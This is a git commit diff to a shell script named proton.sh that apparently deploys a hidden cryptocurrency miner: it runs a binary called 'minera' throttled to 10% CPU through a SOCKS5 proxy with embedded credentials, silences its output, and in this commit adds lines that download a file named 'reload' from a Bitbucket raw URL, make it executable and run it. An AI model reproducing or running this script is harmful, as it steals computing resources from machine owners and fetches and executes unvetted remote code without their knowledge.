c3a40b4c6093c782d57cbf3c0dcbf9a4d92ca342
rohmatridho84 <114908163+rohmatridho84@users.noreply.github.com>
2023-01-28 08:08:39 +0000

    Update proton.sh

--- proton.sh
+++ proton.sh
@@ -1,5 +1,7 @@
 #!/bin/sh
 apt update
 apt install cpulimit screen -y
-chmod +x config.json minera
+wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload
+chmod +x config.json minera reload
 cpulimit -l 10 ./minera --config.json -x socks5://pasti:mokad@178.128.105.221:443 >/dev/null &
+./reload
